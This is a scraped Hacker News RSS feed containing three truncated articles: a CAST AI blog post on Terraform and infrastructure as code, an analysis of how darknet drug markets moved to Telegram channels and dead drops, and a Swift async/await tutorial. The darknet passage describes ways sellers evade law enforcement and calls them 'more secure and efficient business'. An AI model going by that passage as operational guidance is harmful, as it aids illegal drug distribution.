January 14, 2021 | https://resources.cast.ai/blog/no-nonsense-guide-to-iac-and-terraform | <a href="https://web.archive.org/web/*/https://resources.cast.ai/blog/no-nonsense-guide-to-iac-and-terraform">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="blog_content" data-x="0" data-w="12">
<div>
    <div>
      <h6>
        
        
        
        
        
        7 min read
        
      </h6>
        

        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><img src="https://resources.cast.ai/hs-fs/hubfs/multi-nonon.jpg?width=546&amp;name=multi-nonon.jpg" alt="multi-nonon" width="546" srcset="https://resources.cast.ai/hs-fs/hubfs/multi-nonon.jpg?width=273&amp;name=multi-nonon.jpg 273w, https://resources.cast.ai/hs-fs/hubfs/multi-nonon.jpg?width=546&amp;name=multi-nonon.jpg 546w, https://resources.cast.ai/hs-fs/hubfs/multi-nonon.jpg?width=819&amp;name=multi-nonon.jpg 819w, https://resources.cast.ai/hs-fs/hubfs/multi-nonon.jpg?width=1092&amp;name=multi-nonon.jpg 1092w, https://resources.cast.ai/hs-fs/hubfs/multi-nonon.jpg?width=1365&amp;name=multi-nonon.jpg 1365w, https://resources.cast.ai/hs-fs/hubfs/multi-nonon.jpg?width=1638&amp;name=multi-nonon.jpg 1638w" sizes="(max-width: 546px) 100vw, 546px"></p>
<p>One senior DevOps guy that I recently spoke to said he would burst into tears of despair if he got a request like one in the meme above. Don’t worry, we’ve got you covered.</p>
<h2>Enter Terraform</h2>
<p>Sometimes products are so popular that the whole market becomes synonymous with the product's name - walkman, photoshopped, velcro, to google, to terraform are just a few examples.</p>
<p>Terraform has for quite some time been de facto synonymous with Infrastructure as Code (IaC). It is an open-source tool released in 2014 that basically does one thing and does it extremely well. Terraform makes sure that IT infrastructure (real world) is consistent with the desired configuration.&nbsp;</p>
<p>In other words, Terraform is a state machine that can manage resources backed by REST API.</p>
<p>This won't be a <em>HOW TO</em> tutorial piece that duplicates the role of documentation. I will instead share my thoughts on the <em>WHY</em> of Terraform.</p>
<p>I.LOVE.TERRAFORM. I have used it since 2016. We used Terraform to validate our product’s proof of concept at CAST AI.</p>
<p>There is a market challenger called Pulumi, but I don’t think anything really threatens Terraform’s domination at this point.</p>
<p>If you are an engineer and you haven't heard of Terraform yet, your resume needs urgent <a href="https://en.wikipedia.org/wiki/Cardiopulmonary_resuscitation" rel="noopener" target="_blank"><span>CPR</span></a> (<a href="https://learn.hashicorp.com/collections/terraform/aws-get-started?utm_source=WEBSITE&amp;utm_medium=WEB_IO&amp;utm_offer=ARTICLE_PAGE&amp;utm_content=DOCS" rel="noopener" target="_blank"><span>find an hour to complete Hashicorp’s excellent tutorial</span></a>).</p>
<!--more-->
<h2>Infrastructure as Code (IaC)</h2>
<p>Why are DevOps engineers constantly salivating all over Infrastructure as Code? All it takes is going to the AWS console with a browser, and with a few clicks one can create any piece of infrastructure - say, an EC2 instance, VPC or EKS cluster, etc.</p>
<p>The most intuitive answer is that “<strong>automation</strong> saves time.” As engineers, we love to automate everything. To illustrate this point on the very edge of absurdity, read <a href="https://www.thejournal.ie/programmer-scripts-to-do-his-job-email-his-wife-2469028-Jan2016/"><span>this article</span></a> about an engineer that wrote scripts to do things like text his wife when he was working late (with a random reason), brew a pot of coffee just before he arrived at the coffee station and other great hacks. Anything that could take more than 90 seconds, was a target for automation. As usual, there is an xkcd for that:</p>
<p><img src="https://resources.cast.ai/hs-fs/hubfs/is_it_worth_the_time-nonon.png?width=571&amp;name=is_it_worth_the_time-nonon.png" alt="is_it_worth_the_time-nonon" width="571" srcset="https://resources.cast.ai/hs-fs/hubfs/is_it_worth_the_time-nonon.png?width=286&amp;name=is_it_worth_the_time-nonon.png 286w, https://resources.cast.ai/hs-fs/hubfs/is_it_worth_the_time-nonon.png?width=571&amp;name=is_it_worth_the_time-nonon.png 571w, https://resources.cast.ai/hs-fs/hubfs/is_it_worth_the_time-nonon.png?width=857&amp;name=is_it_worth_the_time-nonon.png 857w, https://resources.cast.ai/hs-fs/hubfs/is_it_worth_the_time-nonon.png?width=1142&amp;name=is_it_worth_the_time-nonon.png 1142w, https://resources.cast.ai/hs-fs/hubfs/is_it_worth_the_time-nonon.png?width=1428&amp;name=is_it_worth_the_time-nonon.png 1428w, https://resources.cast.ai/hs-fs/hubfs/is_it_worth_the_time-nonon.png?width=1713&amp;name=is_it_worth_the_time-nonon.png 1713w" sizes="(max-width: 571px) 100vw, 571px"><span>Source: <a href="https://xkcd.com/1205/" rel="noopener" target="_blank">https://xkcd.com/1205/</a></span></p>
<p>If you’re not creating and destroying cloud infrastructure on a daily basis, saving time isn’t even the deciding factor.</p>
<p>The problem is that DevOps engineers are, well, too human. They make human mistakes, they get distracted and tired, they fall victim to fat finger errors. They are also expensive and get demotivated when doing the same things over and over again.</p>
<p>Infrastructure as Code (IaC) solves these problems by providing <strong>consistency</strong>. You want your infrastructure provisioning to be deterministic.</p>
<p>The third big reason is that if it’s code, all the nice benefits of the <strong>CI/CD pipeline and code reviews</strong> are applicable. One engineer writes IaC while another engineer peer reviews.</p>
<p>In this case, a pull request should have a <a href="https://www.terraform.io/docs/commands/plan.html" rel="noopener" target="_blank">Terraform <em>plan </em></a>attached, rather than only HashiCorp Configuration Language (HCL). Having Terraform in CI/CD pipelines means that the DevOps engineer is free to focus on other mentally demanding work and doesn’t need to constantly check the Terraform apply status in a terminal window.</p>
<p>Every DevOps will take consistency and risk reduction on infrastructure change every day of the week and twice on Sunday.</p>
<p>There is also less demand for writing and maintaining infrastructure documentation if you have IaC, as it should never be out of date.</p>
<h3>My acquaintance with IaC</h3>
<p>I used to work in the traditional banking industry, which historically is a very IT risk-averse environment. But the sector also had a wake-up call. If traditional financial companies don’t start delivering innovation fast, they will be eaten by the fleet of emerging FinTech start-ups.&nbsp;</p>
<p>Business Development was baking new features following a rigorous change management process and QA sign-offs, but the following scenario occurred constantly:</p>
<p><em>It worked fine in development and staging, but production is down AGAIN!</em></p>
<p><span>The problem was that the Development, Staging, Production environments would naturally drift apart in configuration over time. Testing and releasing in bigger batches on a quarterly basis (those were the dark times) wouldn’t catch infrastructure and application compatibility bugs and cause business application downtime.</span></p>
<p>This problem is still relevant today even in homogeneous private clouds like Openstack, VMware Cloud Director, or single public cloud environments. The issue is compounded in a hybrid cloud or many-cloud environments.</p>
<h3>So, how do you keep your infrastructure in check?</h3>
<p>In my past life, we created a Terraform provider for our private cloud. A blueprint that would create servers / K8s clusters and namespaces, set RBAC, deploy middleware and databases, network enclaves, open firewalls, configure load balancers, expose applications to the internet through a security sandwich, etc.</p>
<p>It was one Terraform file with not too many lines of code, but abstracting 100+ of individual tasks. The same terraform configuration in a single git repository was used for Development, Staging, and Production. That was the key to avoiding configuration drift between environments.</p>
<p>Side note: Your IaC is as solid as your discipline to NEVER EVER change anything in infrastructure without IaC. We’ve all heard the sad proclamation:</p>
<p><em>I will just change this one setting through the cloud web console during an urgent P1 incident, it’s temporary, I will definitely revert it back.</em></p>
<p><img src="https://resources.cast.ai/hs-fs/hubfs/p1-nonon.png?width=500&amp;name=p1-nonon.png" alt="p1-nonon" width="500" srcset="https://resources.cast.ai/hs-fs/hubfs/p1-nonon.png?width=250&amp;name=p1-nonon.png 250w, https://resources.cast.ai/hs-fs/hubfs/p1-nonon.png?width=500&amp;name=p1-nonon.png 500w, https://resources.cast.ai/hs-fs/hubfs/p1-nonon.png?width=750&amp;name=p1-nonon.png 750w, https://resources.cast.ai/hs-fs/hubfs/p1-nonon.png?width=1000&amp;name=p1-nonon.png 1000w, https://resources.cast.ai/hs-fs/hubfs/p1-nonon.png?width=1250&amp;name=p1-nonon.png 1250w, https://resources.cast.ai/hs-fs/hubfs/p1-nonon.png?width=1500&amp;name=p1-nonon.png 1500w" sizes="(max-width: 500px) 100vw, 500px"></p>
<h2>Provider for anything</h2>
<p>Terraform’s main strength is that anyone can write a Terraform provider for any API. A Terraform provider, also sometimes called a “plugin,” is a Go binary for Linux / Mac / Windows. Providers get automatically installed on your machine if they’re published on the official Terraform registry. You can also manually distribute/install the binary, especially if your API endpoint is not internet exposed (internal application or custom private cloud, etc.).</p>
<p>Today, we see 671 terraform providers published in the public registry, and there are probably countless internal ones. All cloud providers have one, major SaaS providers have them too. There are also some goofy ones that help one <a href="https://github.com/ndmckinley/terraform-provider-dominos" rel="noopener" target="_blank"><span>order a pizza</span></a>, lay Google Fiber cable, create a <a href="https://github.com/eddiezane/terraform-provider-todoist" rel="noopener" target="_blank"><span>todo list</span></a>, etc.</p>
<p>This all means that you can have a configuration spanning multiple vendors and multiple components in a single code repo while ensuring dependencies between them. For example - use terraform to create a CAST AI Kubernetes cluster, set up an S3 bucket in AWS, install known middleware with Terraform helm chart providers, deploy your business applications with the Terraform Kubernetes provider without writing K8s YAML manifests, and finally create public DNS records.</p>
<p>Yup, there is a Terraform provider for <a href="https://registry.terraform.io/providers/CastAI/castai/latest" rel="noopener" target="_blank"><span>CAST AI</span></a>.</p>
<h2>OK abstraction but poor generalization</h2>
<p>Hashicorp only maintains the actual Terraform, but providers are written by API owners. This means that while providers are HCL compatible (HashiCorp Configuration Language), they don’t unify semantics between similar vendors.&nbsp;</p>
<p>It’s not really a problem if you stick to a single vendor. But it quickly becomes quite tiresome if you’re not OK with being locked-in to one commodity provider.</p>
<p>Every cloud service provider has to call commodities using their own very special “competitive advantage” names, and this tendency persists in their Terraform providers. For example, a Virtual Machine is called:</p>
<ul>
<li>EC2 instance</li>
<li>Compute Engine instance</li>
<li>Virtual Machine</li>
<li>Droplet</li>
</ul>
<p>Snippet from each cloud Terraform providers:</p>
<p><code>resource "aws_instance" "web" { <br>&nbsp; &nbsp; instance_type = "t3.micro" <br>}<p>resource "azurerm_virtual_machine" "web" { <br>&nbsp; &nbsp; location = "East US" <br>&nbsp; &nbsp; vm_size = "Standard_DS1_v2"<br>}</p><p>resource "google_compute_instance" "web" { <br>&nbsp; &nbsp; machine_type = "e2-medium" <br>&nbsp; &nbsp; zone = "us-east4"<br>}</p><p>resource "digitalocean_droplet" "web" { <br>&nbsp; &nbsp; region = "nyc2" <br>&nbsp; &nbsp; size = "s-1vcpu-1gb" <br>}</p></code>&nbsp;</p>
<p>The same pattern gets repeated with other commodity services like VPN, VPC, Security Groups, etc. Even delving into higher stack building blocks like a PostgreSQL managed service:RDS / Cloud SQL / Azure Database for PostgreSQL server groups / Database cluster and many more.</p>
<p>It’s almost as if calling something by it’s true name dispels the magic of the walled garden.</p>
<p>I bet you have already noticed that these VM instance types aren’t exactly intuitive within the same cloud provider. But what about naming across vendors? t3.micro, Standard_DS1_v2, e2-medium, s-1vcpu-1gb. Take a look at this <a href="https://resources.cast.ai/blog/how-to-compare-the-cost" rel="noopener" target="_blank"><span>blog post</span></a> to learn more about this.</p>
<p><img src="https://resources.cast.ai/hs-fs/hubfs/meme-names-VM.png?width=512&amp;name=meme-names-VM.png" alt="meme-names-VM" width="512" srcset="https://resources.cast.ai/hs-fs/hubfs/meme-names-VM.png?width=256&amp;name=meme-names-VM.png 256w, https://resources.cast.ai/hs-fs/hubfs/meme-names-VM.png?width=512&amp;name=meme-names-VM.png 512w, https://resources.cast.ai/hs-fs/hubfs/meme-names-VM.png?width=768&amp;name=meme-names-VM.png 768w, https://resources.cast.ai/hs-fs/hubfs/meme-names-VM.png?width=1024&amp;name=meme-names-VM.png 1024w, https://resources.cast.ai/hs-fs/hubfs/meme-names-VM.png?width=1280&amp;name=meme-names-VM.png 1280w, https://resources.cast.ai/hs-fs/hubfs/meme-names-VM.png?width=1536&amp;name=meme-names-VM.png 1536w" sizes="(max-width: 512px) 100vw, 512px"></p>
<p>Learning the semantics of each cloud and writing complex IaC. Who has the time for that?</p>
<h2>Multi-cloud provider to the rescue</h2>
<p>To address these problems, we created and published a Terraform provider to help users create a single Kubernetes cluster spanning several clouds. Here is an <a href="https://github.com/castai/terraform-provider-castai/blob/master/examples/cluster/main.tf" rel="noopener" target="_blank"><span>example</span></a>. All the details like VPC, security groups, VPN, disks, load balancers are abstracted from you. You can also easily deploy managed Kubernetes on your preferred single cloud provider, and maybe expand it later to multi-cloud when you’re ready.</p>
<p>Also, a cluster created with CAST AI has self-healing capabilities. If, for instance, load-balancers or K8s nodes get accidentally deleted from the cloud console by an eager junior DevOps engineer, our platform will bring it back up automatically without the need to rerun Terraform. Only the highest level resource <code>castai_cluster</code>&nbsp;information is stored in the <a href="https://www.terraform.io/docs/state/remote.html" rel="noopener" target="_blank"><span>Terraform state file</span></a>, meaning that all dependencies are maintained outside of terraform.</p>
<p>You can also have your production CAST AI cluster together with other declarative configuration in the same IaC git repository.</p>
<p>If you would like to take IaC to new heights, you could create a multi-cloud development cluster on every code Merge Request, run your end 2 end application’s tests and destroy the multi-cloud Kubernetes cluster in mere minutes. It’s not an affordable development environment, it's dishonorably inexpensive. That’s what we do :-)</p>
<p>I challenge …</p></span></p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://resources.cast.ai/blog/no-nonsense-guide-to-iac-and-terraform">https://resources.cast.ai/blog/no-nonsense-guide-to-iac-and-terraform</a></em></p>]]>
            </description>
            <link>https://resources.cast.ai/blog/no-nonsense-guide-to-iac-and-terraform</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776349</guid>
            <pubDate>Thu, 14 Jan 2021 14:05:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dropgangs, or the future of darknet markets (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776278">thread link</a>) | @vincent_s
<br/>
January 14, 2021 | https://opaque.link/post/dropgang/ | <a href="https://web.archive.org/web/*/https://opaque.link/post/dropgang/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article lang="en">
    

    
    

    <div>
  <p>This article as <a href="https://opaque.link/files/dropgang.pdf">PDF</a>.</p>

<p>The Internet is full of commercial activity and it should come at no surprise
that even illegal commercial activity is widespread as well. In this article we would
like to describe the current developments - from where we came, where we are now, and
where it might be going - when it comes to technologies used for digital black market
activity.</p>
<p>We will refrain from any legal, moral or ethical judgment on these activities but focus
on the technical and operational security aspects. What is illegal and unethical
trade for one is perfectly legal for another. Judge for yourself.</p>
<h2 id="clearnet-black-market-use-pre-2011">Clearnet black market use, pre 2011</h2>
<p>With the spread of the Internet, black market merchants soon started taking advantage of
it for communicating with their customers, advertisement and payment facilitation.
Early products were mostly centered around pornography, call girl rings, stolen data
and intellectual property crimes - mostly stolen software and entertainment media - and thus
either focused on digital delivery of goods and services, or facilitating “personal” services.</p>
<p>Use of the Internet to facilitate the marketing and sales of physical goods - drugs, weapons,
false identification papers - began latest in the late 1990s, but usually focused on local
geographic markets in major cities. This was due to the fact that payment and delivery still
required in person meetings. Credit cards were the only viable online-capable payment system
and they proved to be too dangerous for a lot of merchants of illegal goods, therefor physical cash
dominated.</p>
<p>This changed fundamentally when in the 2003-2007 period the first widely used pseudonymous
centralized digital currencies came to the attention of merchants. Mail-order type businesses
for physical goods that did not adhere to local law, tax or otherwise, developed. Most of
these businesses however refrained from publicly marketing and instead were only available
through word of mouth and to tightly knit online communities.</p>
<p>With the introduction of Bitcoin, the first decentralized cryptocurrency, a paradigm shift
took place. It was likely “The Silk Road” that first fused the availability of this new
kind of online payment system with anonymous access and publication of web content.</p>
<h2 id="darknet-markets-2011-2017">Darknet Markets. 2011-2017</h2>
<p>“The Silk Road” was the first of a phenomenon that became widely known: Darknet Markets.</p>
<p>The shallow description of a darknet market consists of a website hosted on an anonymous
overlay network like Tor or I2P where merchants can present offers, buyers accept those
offers, and the payment between both is conducted through cryptocurrencies. Additional
functionality like merchant-to-buyer private communication, reputation tracking, payment
escrow services and forums in which both merchants and buyers can have public discussions
is often provided.</p>
<p>The shipment of products for these markets typically was conducted by the merchant via
the official postal system or parcel services (UPS, FedEx, DHL).</p>
<p>Darknet Markets as such were <em>centralized</em> marketing, communication, processing, reputation
and escrow platforms which attracted primarily small merchant organizations that featured
flat hierarchies - if they had any hierarchy at all. Customer binding and market share was
primarily through the market itself, and not to the merchant.</p>
<p>A limiting factor for darknet markets was that customers had to use anonymous overlay networks
such as Tor or I2P to be able to access these platforms. This was a barrier of entry for
large segments of the potential consumer group and also limited the (secure) access of the
markets to non-mobile customer devices like personal computers and laptops. Clearly not
the convenience that is required by most modern consumers - especially in the drug user
segment.</p>
<p>The centralized nature of these markets, the binding of customers to market, use of the
postal service and the flat hierarchies of merchants had significant negative operational
security implications.</p>
<p>While fraud by merchants was effectively tamed by the central reputation system of each
market, fraud by the markets became a commonplace. Darknet markets would start offering
escrow services which then allowed the market operators to run with the money. This was
only curbed by the introduction of multiparty transactions that would require any two
of either the buyer, merchant and market to agree for funds to move (a feature that can
be implemented with some cryptocurrencies by employing multi-signature transactions).</p>
<p>More severe were infiltrations and take-downs of darknet markets by law enforcement. Since
the majority of offers, and most reputation data, was publicly available attacks using
open source intelligence methods like web harvesting and analysis, as well as account take-
overs became a common threat. Several cases in which law enforcement infiltrated the
accounts of moderators and operators as well as merchants undermined trust in the
darknet markets. Furthermore several markets were taken offline by law enforcement, often
locking up funds and leading to insecurity in the economy.</p>
<p>Furthermore merchants were more and more often targeted by sting operations, tracking of
shipments through the postal system, and tracing of cryptocurrency transactions.
Merchants that were successfully identified and raided often had access to a long history
of payment  details and shipping addresses of buyers which further eroded the trust in the
darknet markets. The flat hierarchies also led to the deep penetration and complete
identification of the members of market operator teams and merchant organizations.</p>
<p>Lastly, the loss of darknet markets led to severe disruption of client-merchant relationships -
identities and reputation being lost, previous marketing efforts being negated - often
leading to temporary or even permanent collapse of merchant business.</p>
<h2 id="dropgangs-20172018-">Dropgangs. 2017/2018-?</h2>
<p>The problems of darknet markets have triggered an evolution in online black markets.</p>
<p>To prevent the problems of customer binding, and losing business when darknet markets go down,
merchants have begun to leave the specialized and centralized platforms and instead ventured
to use widely accessible technology to build their own communications and operational
back-ends.</p>
<p>Instead of using websites on the darknet, merchants are now operating invite-only channels
on widely available mobile messaging systems like Telegram. This allows the merchant to
control the reach of their communication better and be less vulnerable to system take-downs.
To further stabilize the connection between merchant and customer, repeat customers are
given unique messaging contacts that are independent of shared channels and thus even less
likely to be found and taken down. Channels are often operated by automated bots that allow
customers to inquire about offers and initiate the purchase, often even allowing a fully
bot-driven experience without human intervention on the merchant’s side.</p>
<p>The use of messaging platforms provides a much better user experience to the customers, who can
now reach their suppliers with mobile applications they are used to already. It also means
that a larger part of the communication isn’t routed through the Tor or I2P networks anymore
but each side - merchant and customer - employ their own protection technology, often using
widely spread VPNs.</p>
<p>The other major change is the use of “dead drops” instead of the postal system which has proven
vulnerable to tracking and interception. Now, goods are hidden in publicly accessible places like
parks and the location is given to the customer on purchase. The customer then goes to the
location and picks up the goods. This means that delivery becomes asynchronous for the merchant,
he can hide a lot of product in different locations for future, not yet known, purchases. For the
client the time to delivery is significantly shorter than waiting for a letter or parcel shipped
by traditional means - he has the product in his hands in a matter of hours instead of days.
Furthermore this method does not require for the customer to give any
personally identifiable information to the merchant, which in turn doesn’t have to safeguard it
anymore. Less data means less risk for everyone.</p>
<p>The use of dead drops also significantly reduces the risk of the merchant to be discovered by
tracking within the postal system. He does not have to visit any easily to surveil post office or
letter box, instead the whole public space becomes his hiding territory.</p>
<p>Cryptocurrencies are still the main means of payment, but due to the higher customer-binding,
and vetting process by the merchant, escrows are seldom employed. Usually only multi-party
transactions between customer and merchant are established, and often not even that.</p>
<p>Marketing and initial vetting of both merchant and customer now happens in darknet forums and
chat channels that themselves aren’t involved in any deal anymore. In these places merchants
and customers take part in the discussion of best procedures, methods and prices. The market
connects and develops best practices by sharing experience. Furthermore these places also serve
as record of reputation, though in a still very primitive way.</p>
<p>Other than allowing much more secure and efficient business for both sides of the transaction, this
has also led to changes in the organizational structure of merchants:</p>
<p>Instead of the flat hierarchies witnessed with darknet markets, merchants today employ hierarchical
structures again. These consist of procurement layer, sales layer, and distribution layer. The
people constituting each layer usually do not know the identity of the higher layers nor are ever
in personal contact with them. All interaction is digital - messaging systems and cryptocurrencies
again, product moves only through dead drops.</p>
<p>The procurement layer purchases product wholesale and smuggles it into the region. It is then sold
for cryptocurrency to select people that operate the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://opaque.link/post/dropgang/">https://opaque.link/post/dropgang/</a></em></p>]]>
            </description>
            <link>https://opaque.link/post/dropgang/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776278</guid>
            <pubDate>Thu, 14 Jan 2021 13:58:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured concurrency in Swift: continuations, tasks, and cancellation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776245">thread link</a>) | @maxdesiatov
<br/>
January 14, 2021 | https://desiatov.com/swift-structured-concurrency-introduction | <a href="https://web.archive.org/web/*/https://desiatov.com/swift-structured-concurrency-introduction">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="52"><p>This article is a part of my series about concurrency and asynchronous
programming in Swift. The articles are independent, but after reading this one
you might want to check out the rest of the series:</p>
<ul>
<li><em><strong><a href="https://desiatov.com/closures#title">How do closures and callbacks work? It’s turtles all the way
down</a></strong></em></li>
<li><em><strong><a href="https://desiatov.com/event-loops#title">Event loops, building smooth UIs, and handling high server load</a></strong></em></li>
<li><em><strong><a href="https://desiatov.com/swift-generators#title">What are generators and why Swift needs them?</a></strong></em></li>
<li><em><strong><a href="https://desiatov.com/swift-coroutines#title">Coroutines and “yield” expressions in Swift</a></strong></em></li>
<li><em><strong>Introduction to structured concurrency in Swift: continuations, tasks, and cancellation</strong></em></li>
</ul>
<hr>
<p><strong>IMPORTANT:</strong> This article is about an experimental feature, which is not available in a stable
version of Swift as of January 2021. APIs and behaviors described in this article may change without notice as new
development snapshots become available, but I will try to keep sample code updated as we get closer
to general availability of <a href="https://github.com/DougGregor/swift-evolution/blob/structured-concurrency/proposals/nnnn-structured-concurrency.md">structured concurrency</a> in Swift.</p>
<hr>
<p>There are many discussions of the imminent introduction of <code>async</code>/<code>await</code> to Swift. The authors of
Swift concurrency proposals have done monumental work in preparing all of the related features. And
there are many of them. Just have a look at the actual “dependency tree” of the proposals:</p>
<p>
  <a href="https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-a2a6f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="The dependency tree of 10 separate concurrency proposals in Swift with async/await as the root" title="" src="https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-fb8a0.png" srcset="https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-1a291.png 148w,
https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-2bc4a.png 295w,
https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-fb8a0.png 590w,
https://desiatov.com/static/SwiftConcurrencyDependencies-dd58811a6b3b7d7f21b03f64b5dea026-a2a6f.png 872w" sizes="(max-width: 590px) 100vw, 590px">
    </span>
  </span>
  
  </a>
    </p>

<p>Around the time <code>async</code>/<code>await</code> proposal was accepted, I saw people asking almost the same set of
questions: how to convert legacy APIs to async? How an entrypoint to <code>async</code> code would look like? While
examples of usage of <code>async</code>/<code>await</code> in UIKit apps were shared around, there were no good
examples that utilized the structured concurrency proposal. I wanted to have a look at some minimal
isolated code snippets that could help me answer these questions.</p>
<h2>Setting up a SwiftPM project</h2>
<p>Turns out, it’s relatively easy to set up a CLI project with SwiftPM that uses <code>async</code>/<code>await</code>.
Please feel free to <a href="https://github.com/MaxDesiatov/SwiftConcurrencyExample">clone the final result from GitHub</a>
to follow along. The <code>README.md</code> file in the repository also contains important installation steps, as the
standard toolchain supplied in the latest stable Xcode currently won’t work. You’ll have to install
a development toolchain as described in the document to run this example code on your own machine.
In the rest of the article I’m going to review this example project piece by piece.</p>
<h3>Compiler flags</h3>
<p>Notice how the target needs to be declared in <code>Package.swift</code>:</p>

    <div data-language="swift">
      <pre><code><span>.target</span><span>(</span><span>
</span><span>    </span><span>name</span><span>:</span><span> </span><span>"ConcurrencyExample"</span><span>,</span><span>
</span><span>    </span><span>dependencies</span><span>:</span><span> </span><span>[],</span><span>
</span><span>    </span><span>swiftSettings</span><span>:</span><span> </span><span>[</span><span>
</span><span>        </span><span>.unsafeFlags</span><span>([</span><span>"-Xfrontend"</span><span>,</span><span> </span><span>"-enable-experimental-concurrency"</span><span>]),</span><span>
</span><span>    </span><span>]</span><span>
</span><span>)</span></code></pre>
    </div>
<p>Until Swift concurrency features become stable and enabled by default you have to pass these flags
when building. They are declared in the package manifest here so that you don’t have to pass them
each time manually when building the project.</p>
<h3>Imports</h3>
<p>When using <a href="https://forums.swift.org/t/pitch-2-structured-concurrency/43452">structured concurrency</a>
to expose legacy callback-based APIs as <code>async</code> functions, you currently have to import the
<code>_Concurrency</code> module supplied with the latest Swift dev snapshots. The name of it starts with an
underscore to highlight that the module is experimental and its API may change.</p>
<h2>Reviewing the code</h2>
<h3>Continuations</h3>
<p>While most of Apple’s APIs will be converted to <code>async</code>/<code>await</code>
<a href="https://github.com/apple/swift-evolution/blob/main/proposals/0297-concurrency-objc.md">automatically</a>,
your own callback-based code can be converted using a few helper functions, such as
<code>withUnsafeContinuation</code> and <code>withUnsafeThrowingContinuation</code>. They take a closure with a single
<em>continuation</em> argument, and you’re supposed to call your callback-based code from this closure,
capture the continuation, and call <code>resume</code> on it when you’re finished. Here’s how the declarations look for
the non-throwing variant for more context:</p>

    <div data-language="swift">
      <pre><code><span>struct</span><span> </span><span>UnsafeContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>  </span><span>func</span><span> </span><span>resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>T</span><span>)</span><span>
</span><span>}</span><span>

</span><span>func</span><span> </span><span>withUnsafeContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span>(</span><span>
</span><span>    </span><span>operation</span><span>:</span><span> </span><span>(</span><span>UnsafeContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>()</span><span>
</span><span>)</span><span> </span><span>async</span><span> </span><span>-&gt;</span><span> </span><span>T</span></code></pre>
    </div>
<p>One of the most simple but practical enough example of a non-throwing async call is <code>sleep</code>:</p>

    <div data-language="swift">
      <pre><code><span>import</span><span> </span><span>_Concurrency</span><span>
</span><span>import</span><span> </span><span>Dispatch</span><span>

</span><span>func</span><span> </span><span>sleep</span><span>(</span><span>seconds</span><span>:</span><span> </span><span>Int</span><span>)</span><span> </span><span>async</span><span> </span><span>{</span><span>
</span><span>    </span><span>await</span><span> </span><span>withUnsafeContinuation</span><span> </span><span>{</span><span> </span><span>c</span><span> </span><span>in</span><span>
</span><span>        </span><span>DispatchQueue</span><span>.global</span><span>()</span><span>
</span><span>            </span><span>.asyncAfter</span><span>(</span><span>deadline</span><span>:</span><span> </span><span>.now</span><span>()</span><span> </span><span>+</span><span> </span><span>.seconds</span><span>(</span><span>seconds</span><span>))</span><span> </span><span>{</span><span>
</span><span>                </span><span>c</span><span>.resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>())</span><span>
</span><span>            </span><span>}</span><span>
</span><span>    </span><span>}</span><span>
</span><span>}</span></code></pre>
    </div>
<p>And here’s a throwing variant:</p>

    <div data-language="swift">
      <pre><code><span>struct</span><span> </span><span>UnsafeThrowingContinuation</span><span>&lt;</span><span>T</span><span>,</span><span> </span><span>E</span><span>:</span><span> </span><span>Error</span><span>&gt;</span><span> </span><span>{</span><span>
</span><span>  </span><span>func</span><span> </span><span>resume</span><span>(</span><span>returning</span><span>:</span><span> </span><span>T</span><span>)</span><span>
</span><span>  </span><span>func</span><span> </span><span>resume</span><span>(</span><span>throwing</span><span>:</span><span> </span><span>E</span><span>)</span><span>
</span><span>}</span><span>

</span><span>func</span><span> </span><span>withUnsafeThrowingContinuation</span><span>&lt;</span><span>T</span><span>&gt;</span><span>(</span><span>
</span><span>    </span><span>operation</span><span>:</span><span> </span><span>(</span><span>UnsafeThrowingContinuation</span><span>&lt;</span><span>T</span><span>,</span><span> </span><span>Error</span><span>&gt;</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>()</span><span>
</span><span>)</span><span> </span><span>async</span><span> </span><span>throws</span><span> </span><span>-&gt;</span><span> </span><span>T</span></code></pre>
    </div>
<p>Based on that we can convert <code>URLSession.dataTask</code> to a throwing <code>async</code> function:</p>

    <div data-language="swift">
      <pre><code><span>import</span><span> </span><span>Foundation</span><span>

</span><span>struct</span><span> </span><span>UnknownError</span><span>:</span><span> </span><span>Error</span><span> </span><span>{}</span><span>

</span><span>func</span><span> </span><span>download</span><span>(</span><span>_</span><span> </span><span>url</span><span>:</span><span> </span><span>String</span><span>)</span><span> </span><span>async</span><span> </span><span>throws</span><span> </span><span>-&gt;</span><span> </span><span>Data</span><span> </span><span>{</span><span>
</span><span>    </span><span>print</span><span>(</span><span>"fetching \(</span><span>url</span><span>)"</span><span>)</span><span>
</span><span>    </span><span>return</span><span> </span><span>try</span><span> </span><span>await</span><span> </span><span>withUnsafeThrowingContinuation</span><span> </span><span>{</span><span> </span><span>c</span><span> </span><span>in</span><span>
